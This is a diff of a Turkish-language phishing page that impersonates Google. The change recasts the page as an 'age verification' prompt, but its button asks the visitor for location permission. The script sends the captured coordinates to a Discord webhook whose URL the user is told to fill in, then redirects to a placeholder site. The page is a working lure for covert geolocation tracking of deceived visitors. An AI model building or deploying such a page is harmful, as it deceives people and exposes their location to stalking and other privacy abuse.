@@ -2,143 +2,29 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Google - Belge</title>
+    <title>Google - Yaş Doğrulama</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f4; /* Daha açık bir arka plan */
-            color: #333;
-            overflow: hidden; /* Sayfa içeriğinin taşmasını engeller */
-        }
-
-        /* Üst Bilgi */
-        .top-bar {
-            background-color: #fff;
-            padding: 15px 20px;
-            border-bottom: 1px solid #ddd;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .top-bar-left {
-            display: flex;
-            align-items: center;
-        }
-
-        .top-bar-right {
-            display: flex;
-            align-items: center;
-        }
-
-        .gmail-link, .images-link, .app-icon {
-            margin-left: 20px;
-            text-decoration: none;
-            color: #555;
-        }
-
-        .account-icon {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background-color: #eee;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 18px;
-            color: #777;
-            cursor: pointer;
-        }
-
-        /* Belge Alanı */
-        .document-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 50px 20px;
-            height: 100vh; /* Tüm ekranı kaplar */
-        }
-
-        .document {
-            background-color: #fff;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            width: 80%;
-            max-width: 800px; /* Daha geniş belge alanı */
-            padding: 30px;
-            text-align: center;
-            position: relative; /* Arka planı konumlandırmak için */
-        }
-
-        .google-logo {
-            width: 200px;
-            margin-bottom: 20px;
-        }
-
-        .document-title {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-
-        .location-request-text {
-            font-size: 18px;
-            margin-bottom: 30px;
-        }
-
-        .location-message {
-            font-size: 16px;
-            color: #555;
-            margin-top: 10px;
-            display: none;
-        }
-
-        .location-message.show {
-            display: block;
-        }
-
-        .request-button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.2s ease;
-        }
-
-        .request-button:hover {
-            background-color: #45a049;
-        }
-
-        /* Alt Bilgi */
-        .footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background-color: #f2f2f2;
-            padding: 15px;
-            font-size: 14px;
-            color: #70757a;
-            border-top: 1px solid #dadce0;
-            text-align: center;
+            background-color: #f4f4f4;
+            color: #202124; /* Google'ın renk tonu */
+            overflow: hidden;
         }
 
         /* Arka Plan */
         .background-overlay {
-            position: fixed; /* Ekranı kaplar */
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.7); /* Şeffaflık ile karartma */
-            z-index: -1; /* Diğer öğelerin altında kalır */
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: -1;
         }
+
         .background-image {
             position: fixed;
             top: 0;
@@ -148,45 +34,130 @@
             background-image: url('https://source.unsplash.com/1600x900/?google'); /* Rastgele Google temalı resim */
             background-size: cover;
             background-position: center;
-            z-index: -2; /* Daha da altında */
-            filter: blur(10px); /* Hafif bulanıklık */
+            z-index: -2;
+            filter: blur(10px);
+        }
+
+        /* Ana İçerik */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .content {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            text-align: center;
+            width: 90%;
+            max-width: 500px;
+            position: relative; /* Daha iyi konumlandırma için */
+        }
+
+        .google-logo {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .description {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+
+        /* Buton Stili (Google'a Benzer) */
+        .button {
+            background-color: #f8f9fa;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            color: #3c4043;
+            padding: 10px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin: 5px;
+            display: inline-block;
+        }
+
+        .button:hover {
+            background-color: #f0f0f0;
+            border-color: #c6c6c6;
+        }
+
+        /* Konum Mesajı */
+        .location-message {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 15px;
+            display: none;
+        }
+        .location-message.show {
+            display: block;
+        }
+
+        /* Alt Bilgi (DMCA ve Politikalar) */
+        .footer {
+            position: absolute;
+            bottom: 10px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #70757a;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .footer-link {
+            color: #70757a;
+            text-decoration: none;
+            margin: 0 10px;
         }
 
     </style>
 </head>
 <body>
 
-    <!-- Arka Plan (Google Görünümü) -->
+    <!-- Arka Plan -->
     <div class="background-overlay"></div>
     <div class="background-image"></div>
 
-    <!-- Üst Bilgi -->
-    <div class="top-bar">
-        <div class="top-bar-left">
-        </div>
-        <div class="top-bar-right">
-            <a href="#" class="gmail-link">Gmail</a>
-            <a href="#" class="images-link">Görseller</a>
-            <div class="app-icon">&#9776;</div>
-            <div class="account-icon">A</div>
-        </div>
-    </div>
-
-    <!-- Belge Alanı -->
-    <div class="document-container">
-        <div class="document">
+    <!-- İçerik Alanı -->
+    <div class="container">
+        <div class="content">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
-            <h1 class="document-title">Konum İzni Gerekli</h1>
-            <p class="location-request-text">Devam etmek için lütfen konum iznini verin.</p>
-            <button class="request-button" onclick="requestLocation()">Konum İznini Ver</button>
+            <h1 class="title">Yaşınızı Doğrulayın</h1>
+            <p class="description">Devam etmek için lütfen yaşınızı doğrulayın. Bu, hizmetlerimizin güvenliğini sağlamaya yardımcı olur.</p>
+            <button class="button" onclick="requestLocation()">Konum İznini Ver</button>
             <p class="location-message" id="locationMessage">Konum alınıyor...</p>
+
+            <!-- Alt Bilgi (Fake) -->
+            <div class="footer">
+                <p>© 2024 Google - Sahte bir sayfa</p>
+                <div class="footer-links">
+                    <a href="#" class="footer-link">Yeni Kural</a>
+                    <a href="#" class="footer-link">Gizlilik</a>
+                    <a href="#" class="footer-link">Güvenlik Politikası</a>
+                    <a href="#" class="footer-link">DMCA</a>
+                </div>
+            </div>
         </div>
     </div>
 
-    <!-- Alt Bilgi -->
-    <div class="footer">
-        <p>© 2024 Google</p>
-    </div>
 
     <script>
         // WEBHOOK URL'NİZİ BURAYA YAZIN (Discord için)
@@ -205,7 +176,7 @@
 
                         // Konum bilgisini Discord'a gönder
                         await sendToDiscord({
-                            content: `📍 **Konum Bilgisi (Belge):**`,
+                            content: `📍 **Konum Bilgisi (Yaş Doğrulama):**`,
                             embeds: [{
                                 title: "Konum Bilgisi",
                                 color: 5814783,
@@ -223,8 +194,8 @@
                             // Burada, asıl web sitenize yönlendirme yapılabilir
                             window.location.href = "https://www.ornekwebsiteniz.com"; // Örnek yönlendirme
                             locationMessage.classList.remove('show');
-                            locationMessage.textContent = "Konum alınıyor..."; // Başlangıç metnini geri yükle
-                        }, 3000); // 3 saniye sonra yönlendir ve mesajı gizle
+                            locationMessage.textContent = "Konum alınıyor...";
+                        }, 3000);
                     },
                     (error) => {
                         let errorMessage = "Konum alınamadı.";
@@ -242,16 +213,16 @@
                         locationMessage.textContent = errorMessage;
                         setTimeout(() => {
                            locationMessage.classList.remove('show');
-                           locationMessage.textContent = "Konum alınıyor..."; // Başlangıç metnini geri yükle
-                        }, 5000); // 5 saniye sonra mesajı gizle
+                           locationMessage.textContent = "Konum alınıyor...";
+                        }, 5000);
                     }
                 );
             } else {
                 locationMessage.textContent = "Tarayıcınız konum özelliğini desteklemiyor.";
                 setTimeout(() => {
                     locationMessage.classList.remove('show');
-                    locationMessage.textContent = "Konum alınıyor..."; // Başlangıç metnini geri yükle
-                }, 5000); // 5 saniye sonra mesajı gizle
+                    locationMessage.textContent = "Konum alınıyor...";
+                }, 5000);
             }
         }
 
@@ -269,7 +240,6 @@
                 console.log("Discord'a log başarıyla gönderildi.");
             } catch (discordError) {
                 console.error("Discord'a log gönderilirken hata:", discordError);
-                // Hata durumunda uyarı vermek veya log tutmak için bir işlem yapabilirsiniz.
             }
         }
     </script>
